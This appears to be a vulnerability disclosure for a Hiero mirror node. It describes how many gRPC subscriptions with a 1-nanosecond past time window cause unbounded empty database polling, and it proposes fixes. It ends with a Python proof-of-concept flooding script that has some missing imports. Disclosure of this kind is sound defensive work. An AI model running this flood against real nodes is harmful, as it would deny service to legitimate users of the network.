### Title
Unbounded Empty-Poll DoS via Narrow endTime Window in PollingTopicListener

### Summary
`PollingTopicListener.poll()` reconstructs a filter preserving the original `endTime` but never enforces a minimum gap between `startTime` and `endTime`. An unauthenticated attacker can open many subscriptions with `endTime = startTime + 1ns` (both in the past), causing each subscription to fire a real DB query every 500ms that always returns zero rows, with no global subscription cap to bound the aggregate DB load.

### Finding Description

**Exact code path:**

In `poll()`, the filter is rebuilt preserving `endTime` from the original filter:

```java
// grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java, lines 51-62
private Flux<TopicMessage> poll(PollingContext context) {
    TopicMessageFilter filter = context.getFilter();
    TopicMessage last = context.getLast();
    int limit = filter.hasLimit()
            ? (int) (filter.getLimit() - context.getCount().get())
            : Integer.MAX_VALUE;
    int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
    long startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
    var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();
    return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
}
``` [1](#0-0) 

`toBuilder()` copies all fields; only `limit` and `startTime` are overridden. The original `endTime` is preserved unchanged. Since `last` is always `null` when no results are returned, `startTime` never advances, and the same 1-nanosecond window is re-queried on every tick.

**Root cause — failed assumption in `TopicMessageFilter.isValidEndTime()`:**

```java
// grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java, lines 43-46
@AssertTrue(message = "End time must be after start time")
public boolean isValidEndTime() {
    return endTime == null || endTime > startTime;
}
``` [2](#0-1) 

The only constraint is `endTime > startTime`. A 1-nanosecond gap passes. There is no minimum window size and no check that `endTime` is in the future.

**Polling loop runs indefinitely per subscription:**

```java
// lines 38-43
return Flux.defer(() -> poll(context))
        .delaySubscription(interval, scheduler)
        .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                .jitter(0.1)
                .withFixedDelay(interval)
                .withScheduler(scheduler))
``` [3](#0-2) 

Default `interval = 500ms`. Each tick calls `findByFilter()`, which issues a real JPA/JDBC query against the DB. [4](#0-3) 

**Termination path is slow:** `TopicMessageServiceImpl.pastEndTime()` checks `topicContext.isComplete()` only every `endTimeInterval = 30s` (default). [5](#0-4) 

During those 30 seconds each subscription fires ~60 empty DB queries. The `takeWhile` on `endTime` only fires when a message is actually emitted — with zero results it never triggers. [6](#0-5) 

**No global subscription cap:** `subscriberCount` is a metric gauge only; it is never used to reject new subscriptions. [7](#0-6) 

**Per-connection limit is insufficient:** `maxConcurrentCallsPerConnection = 5` limits calls per TCP connection, not total connections or total subscriptions globally. [8](#0-7) 

An attacker opens N connections × 5 subscriptions each = 5N concurrent subscriptions, each generating 2 DB queries/second.

### Impact Explanation

With `listener.type = POLL`, each malicious subscription holds a DB connection slot for up to 30 seconds and fires ~60 queries that return zero rows. At 200 connections (1000 subscriptions), the attacker generates ~2000 empty DB queries/second. This saturates the gRPC module's connection pool, causing legitimate `subscribeTopic` calls to queue or fail, and can cascade to DB-level connection exhaustion. The gRPC mirror node becomes unable to serve any topic subscriptions — a full service outage for the HCS streaming path.

### Likelihood Explanation

The attack requires no credentials, no special knowledge beyond the public gRPC proto, and no state. The only precondition is that the operator has set `hiero.mirror.grpc.listener.type = POLL` (non-default; default is `REDIS`). When POLL mode is active, the attack is trivially repeatable with a simple loop of gRPC `subscribeTopic` calls using any past timestamp pair. The attacker does not need to maintain connections — they can continuously open and discard them.

### Recommendation

1. **Enforce a minimum endTime–startTime gap** in `TopicMessageFilter.isValidEndTime()`, e.g., require `endTime - startTime >= some_minimum_ns`.
2. **Add a global concurrent-subscription cap** in `TopicMessageServiceImpl.subscribeTopic()`, rejecting new subscriptions when `subscriberCount` exceeds a configurable threshold.
3. **Terminate subscriptions immediately** when `endTime` is already in the past at subscription time, before any polling begins.
4. **Apply per-IP or per-client rate limiting** on `subscribeTopic` calls at the gRPC interceptor layer.

### Proof of Concept

```python
import grpc
from hedera.mirror.api.proto import consensus_service_pb2_grpc
from com.hederahashgraph.api.proto.java import consensus_service_pb2
from google.protobuf.timestamp_pb2 import Timestamp

channel = grpc.insecure_channel("mirror-node:5600")
stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)

# startTime = 1 second ago, endTime = 1 nanosecond after startTime (both in the past)
start_sec = int(time.time()) - 1
query = ConsensusTopicQuery(
    topicID=TopicID(topicNum=1),
    consensusStartTime=Timestamp(seconds=start_sec, nanos=0),
    consensusEndTime=Timestamp(seconds=start_sec, nanos=1),  # 1ns window
)

# Open 5 subscriptions per connection, many connections
for _ in range(200):  # 200 connections × 5 = 1000 subscriptions
    ch = grpc.insecure_channel("mirror-node:5600")
    s = consensus_service_pb2_grpc.ConsensusServiceStub(ch)
    for _ in range(5):
        threading.Thread(target=lambda: list(s.subscribeTopic(query))).start()

# Each subscription now fires ~2 empty DB queries/second for ~30 seconds
# Total: ~2000 empty DB queries/second sustained
```
